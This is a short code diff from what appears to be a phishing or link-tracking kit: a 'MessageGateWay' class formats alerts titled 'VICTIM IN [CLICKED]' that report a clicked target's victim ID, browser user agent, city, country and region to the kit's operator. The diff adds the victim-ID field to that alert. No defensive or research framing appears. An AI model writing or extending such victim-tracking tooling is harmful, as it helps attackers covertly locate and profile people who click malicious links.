@@ -35,7 +35,8 @@ class MessageGateWay:
             case 'click':
                 return (
                     f"📱 *VICTIM IN [CLICKED]:* \n\n"
-                    f"🌐 *BROWSER:* `{self.data.get('click')['USER_AGENT']}`\n\n"
+                    f"🌐 *VICTIM CLICK:* `{self.data.get('click')['VICTIM_ID']}`\n\n"
+                    f"👤 *BROWSER:* `{self.data.get('click')['USER_AGENT']}`\n\n"
                     f"📍 *CITY:* `{self.data.get('click')['CITY']}`\n\n"
                     f"📍 *COUNTRY:* `{self.data.get('click')['COUNTRY']}`\n\n"
                     f"📍 *REGION:* `{self.data.get('click')['REGION']}`\n\n"
